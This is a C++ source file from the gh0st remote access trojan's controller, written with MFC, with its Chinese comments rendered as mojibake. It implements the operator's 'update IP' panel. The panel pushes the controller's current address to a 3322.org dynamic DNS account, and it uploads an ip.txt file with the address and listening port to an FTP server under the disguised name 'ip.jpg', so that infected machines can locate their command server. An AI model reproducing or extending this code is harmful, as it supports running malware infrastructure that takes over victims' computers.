// UpIp.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "UpIp.h"
#include<winsock2.h>
#include <wininet.h>
#include <shlwapi.h>
#pragma comment(lib,"shlwapi.lib")
#pragma comment(lib,"WS2_32")
#pragma comment (lib,"Wininet.lib") 
#include "afxinet.h" //WinInet�һݭn���Y���


#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif
char url[100],ip[40];
/////////////////////////////////////////////////////////////////////////////
// CUpIp

IMPLEMENT_DYNCREATE(CUpIp, CFormView)

CUpIp::CUpIp()
	: CFormView(CUpIp::IDD)
{
	//{{AFX_DATA_INIT(CUpIp)
	m_FtpIP = _T("");
	m_FtpPort = 21;
	m_Pass = _T("");
	m_User = _T("");
	m_FtpUrl = _T("ip.jpg");
	//}}AFX_DATA_INIT
}

CUpIp::~CUpIp()
{
}

void CUpIp::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CUpIp)
	DDX_Text(pDX, IDC_FTPIP, m_FtpIP);
	DDX_Text(pDX, IDC_FTPPORT, m_FtpPort);
	DDX_Text(pDX, IDC_PASS, m_Pass);
	DDX_Text(pDX, IDC_USER, m_User);
	DDX_Text(pDX, IDC_FTPURL, m_FtpUrl);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CUpIp, CFormView)
	//{{AFX_MSG_MAP(CUpIp)
	ON_BN_CLICKED(IDC_UPDNSIP, OnUpdnsip)
	ON_BN_CLICKED(IDC_UPFTP, OnUpftp)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CUpIp diagnostics

#ifdef _DEBUG
void CUpIp::AssertValid() const
{
	CFormView::AssertValid();
}

void CUpIp::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CUpIp message handlers

void CUpIp::OnUpdnsip() 
{

	CString strUpdateIP       = "�ƺ���W��s";
	CString strSectionKey     = "�ƺ���W";
	char strBuff[256];
	CString strValue       = _T("");
	CString strFilePath;
	char Path[MAX_PATH];
	GetModuleFileName(0,Path,sizeof(Path));
	PathRemoveFileSpec(Path);
	strFilePath.Format("%s\\ini\\UpIp.ini",Path);
	//MessageBox(strFilePath,"ok");
	GetDlgItemText(IDC_DNS,strValue);     //����ƺ���W
	WritePrivateProfileString(strUpdateIP,strSectionKey,strValue,strFilePath);  //�g�Jini��󤤬����r�q
	/*
	strSectionKey="�W�uIP";
	GetDlgItemText(IDC_IP,strValue);   //����W�uip
	WritePrivateProfileString(strUpdateIP,strSectionKey,strValue,strFilePath);
	*/
	strSectionKey="�Τ�W";
	GetDlgItemText(IDC_DNSID,strValue);   //����Τ�W
	WritePrivateProfileString(strUpdateIP,strSectionKey,strValue,strFilePath);

	strSectionKey="�Τ�K�X";
	GetDlgItemText(IDC_DNSPASS,strValue);   //����Τ�K�X
	WritePrivateProfileString(strUpdateIP,strSectionKey,strValue,strFilePath);

	CString id,pass,dns,ip; 
	char a[256]="http://";
	char *b="@members.3322.org/dyndns/update?system=dyndns&hostname=";
	char *c="&myip=";
	char *d="&wildcard=OFF";
    GetDlgItem(IDC_DNSID)->GetWindowText(id);
	GetDlgItem(IDC_DNSPASS)->GetWindowText(pass);
	GetDlgItem(IDC_DNS)->GetWindowText(dns);
	GetDlgItem(IDC_IP)->GetWindowText(ip);
	strcat(a,id);
	strcat(a,":");
	strcat(a,pass);
	strcat(a,b);
	strcat(a,dns);
	strcat(a,c);
	strcat(a,ip);
	strcat(a,d);
  
	//	 MessageBox(a);
	//"http://xxxx:xxxxx@members.3322.org/dyndns/update?system=dyndns&hostname=xxxxx.3322.org&myip=192.168.0.1&wildcard=OFF"; 

	HINTERNET hNet = ::InternetOpen("3322", //��HTTP��ĳ�ϥήɡA�o�ӰѼ��H�N��� 
	PRE_CONFIG_INTERNET_ACCESS, //�X����������Win32������ƨϥεn�O�H���h�o�{�@�ӪA�Ⱦ��C 
	NULL, 
	INTERNET_INVALID_PORT_NUMBER, //�ϥ�INTERNET_INVALID_PORT_NUMBER�۷�󴣨ѫo�٪��ݤf�ơC 
	0 //�лx�h���ܨϥΪ�^�y�y�`���N�Ӫ�Internet��ƱN"��"���^�ը�Ƶo�e���A�H�� 
	); 

	HINTERNET hUrlFile = ::InternetOpenUrl(hNet, //�qInternetOpen��^���y�` 
	(char *)a, //�ݭn���}��URL 
	NULL, //�ΨӦV�A�Ⱦ��ǰe�B�~���H��,�@�묰NULL 
	0, //�ΨӦV�A�Ⱦ��ǰe�B�~���H��,�@�묰 0 
	INTERNET_FLAG_RELOAD, //InternetOpenUrl�欰���лx 
	0); //�H���N���|�Q�e�쪬�A�^�ը�� 

	char buffer[1024] ; 
	DWORD dwBytesRead = 0; 
	BOOL bRead = ::InternetReadFile(hUrlFile, //InternetOpenUrl��^���y�` 
	buffer, //�O�d�ƾڪ��w�İ� 
	sizeof(buffer), 
	&dwBytesRead); //���V�]�tŪ�J�w�İϦr�`�ƪ��ܶq�����w; 
	//�p�G��^�ȬOTRUE�A�ӥB�o�̫��V0�A�h���w�gŪ��F��󪺥����C 

	::InternetCloseHandle(hUrlFile) ; 
	::InternetCloseHandle(hNet) ; 

    if(buffer>0)
	{
        if(strstr(buffer,"badauth"))
			MessageBox("ID �� �K�X���~ ...");
		if(strstr(buffer,"good"))
			MessageBox("��s���\ ...\r\n"+ip);
		if(strstr(buffer,"nohost"))
			MessageBox("DNS���~ ...\n\r���ˬd�O�_��J���T");
		if(strstr(buffer,"nochg"))
			MessageBox("�Ф��n���Ч�s ...");
	}
	memset(buffer,0,sizeof(buffer));
}

void CUpIp::OnInitialUpdate() 
{
	CFormView::OnInitialUpdate();
}

void CUpIp::OnUpftp() 
{
	UpdateData(TRUE);

	/////////////////////////////////////////////////////////////////////////////////////////////
/*
	// �O�s�t�m�H��

	CString strUpdateIP       = "FTP��s";		//   [FTP��s]
	CString strSectionKey     = "FTP�A�Ⱦ�";
	char strBuff[256];
	CString strValue       = _T("");
	CString strFilePath;
	char Path[MAX_PATH];
	GetModuleFileName(0,Path,sizeof(Path));
	PathRemoveFileSpec(Path);
	strFilePath.Format("%s\\ini\\UpIp.ini",Path);
	//MessageBox(strFilePath,"ok");
	GetDlgItemText(IDC_FTPIP,strValue);			//���FTP
	WritePrivateProfileString(strUpdateIP,strSectionKey,strValue,strFilePath);  //�g�Jini��󤤬����r�q

	strSectionKey="�s��IP�����";
	GetDlgItemText(IDC_FTPURL,strValue);	    //���ip���
	WritePrivateProfileString(strUpdateIP,strSectionKey,strValue,strFilePath);

	strSectionKey="�ݤf";
	GetDlgItemText(IDC_FTPPORT,strValue);		//����ݤf
	WritePrivateProfileString(strUpdateIP,strSectionKey,strValue,strFilePath);

	strSectionKey="�W�u�ݤf";
	GetDlgItemText(IDC_LOCALPORT,strValue);		//����W�u�ݤf
	WritePrivateProfileString(strUpdateIP,strSectionKey,strValue,strFilePath);

	strSectionKey="�Τ�W";
	GetDlgItemText(IDC_USER,strValue);			//����Τ�W
	WritePrivateProfileString(strUpdateIP,strSectionKey,strValue,strFilePath);

	strSectionKey="�Τ�K�X";
	GetDlgItemText(IDC_PASS,strValue);			//����Τ�K�X
	WritePrivateProfileString(strUpdateIP,strSectionKey,strValue,strFilePath);
*/
	/////////////////////////////////////////////////////////////////////////////////////////////



	//���]���aIP�κݤf�H�������------------------
	CString ip,str;
	GetDlgItem(IDC_LOCALIP)->GetWindowText(ip);
	GetDlgItem(IDC_LOCALPORT)->GetWindowText(str);
	ip=ip+":"+str;
	HANDLE hFile;
    hFile = CreateFile("ip.txt", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD numWrite;
    WriteFile (hFile,ip,ip.GetLength(), &numWrite, NULL);	
	CloseHandle(hFile);

	//FTP�W�Ǥ��---------------------------------
	CInternetSession *seu;
	CFtpConnection *pFTP;
	   //�s�ع��
	seu=new CInternetSession(AfxGetAppName(),1,PRE_CONFIG_INTERNET_ACCESS);
	try 
	{ 
		//�s�سs����H
		pFTP=seu->GetFtpConnection(m_FtpIP,m_User,m_Pass,m_FtpPort,FALSE); 
	} 
	catch(CInternetException *pEx) 
	{
		//������~
		TCHAR szError[1024];
		if(pEx->GetErrorMessage(szError,1024))
			AfxMessageBox(szError);
		else  
			AfxMessageBox("There was an exception");
		pEx->Delete();
		pFTP=NULL;
		return;
	}
    //�W��
	if(pFTP->PutFile("ip.txt",m_FtpUrl))
			AfxMessageBox("��sIP���\ ...");
    pFTP->Close();
}

void CUpIp::OnActivateView(BOOL bActivate, CView* pActivateView, CView* pDeactiveView) 
{
	////////////////////////////////////////////////////////////////////
/*
	CString strSection       = "FTP��s";
	CString strSectionKey    = "FTP�A�Ⱦ�";
	char strBuff[256];
	CString strValue       = _T("");
	CString strFilePath;

	char Path[MAX_PATH];
	GetModuleFileName(0,Path,sizeof(Path));
	PathRemoveFileSpec(Path);
	strFilePath.Format("%s\\ini\\UpIp.ini",Path);

	GetPrivateProfileString(strSection,strSectionKey,NULL,strBuff,500,strFilePath); //Ū��ini��󤤬����r�q�����e
	strValue=strBuff;
	GetDlgItem(IDC_FTPIP)->SetWindowText(strValue);



	//SetDlgItemText(IDC_FTPIP,strValue);

	strSectionKey="�s��IP�����";
	GetPrivateProfileString(strSection,strSectionKey,NULL,strBuff.GetBuffer(MAX_PATH),80,strFilePath);
	strValue=strBuff;
	SetDlgItemText(IDC_FTPURL,strValue);

	strSectionKey="�s��IP�����";
	GetPrivateProfileString(strSection,strSectionKey,NULL,strBuff,80,strFilePath);
	strValue=strBuff;
	SetDlgItemText(IDC_FTPURL,strValue);

	strSectionKey="�ݤf";
	GetPrivateProfileString(strSection,strSectionKey,NULL,strBuff,80,strFilePath);
	strValue=strBuff;
	SetDlgItemText(IDC_FTPPORT,strValue);

	strSectionKey="�W�u�ݤf";
	GetPrivateProfileString(strSection,strSectionKey,NULL,strBuff,80,strFilePath);
	strValue=strBuff;
	SetDlgItemText(IDC_LOCALPORT,strValue);

	strSectionKey="�Τ�W";
	GetPrivateProfileString(strSection,strSectionKey,NULL,strBuff,80,strFilePath);
	strValue=strBuff;
	SetDlgItemText(IDC_USER,strValue);

	strSectionKey="�Τ�K�X";
	GetPrivateProfileString(strSection,strSectionKey,NULL,strBuff,80,strFilePath);
	strValue=strBuff;
	SetDlgItemText(IDC_PASS,strValue);

	UpdateData(FALSE);
*/
	////////////////////////////////////////////////////////////////////



		int	nEditControl1[] = {IDC_DNS};
		for (int i = 0; i < sizeof(nEditControl1) / sizeof(int); i++)
		m_Edit1[i].SubclassDlgItem(nEditControl1[i], this);



	//��oIP
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2,2),&wsaData);
	char szhostname[128];
    CString str;
	if( gethostname(szhostname, 128) == 0 )
	{
		struct hostent * phost;
		int i=0,j,h_length=4;
		phost = gethostbyname(szhostname);
		for( j = 0; j<h_length; j++ )
		{
			CString addr;			
			if( j > 0 )
				str += ".";			
			addr.Format("%u", (unsigned int)((unsigned char*)phost->h_addr_list[i])[j]);
			str += addr;
		}
	}
    //m_sIPAddress=str;
    WSACleanup();

	GetDlgItem(IDC_FTPPORT)->SetWindowText("21");
	GetDlgItem(IDC_LOCALPORT)->SetWindowText("3648");
	GetDlgItem(IDC_LOCALIP)->SetWindowText(str);
    GetDlgItem(IDC_IP)->SetWindowText(str);
	UpdateData(FALSE);
	CFormView::OnActivateView(bActivate, pActivateView, pDeactiveView);
}

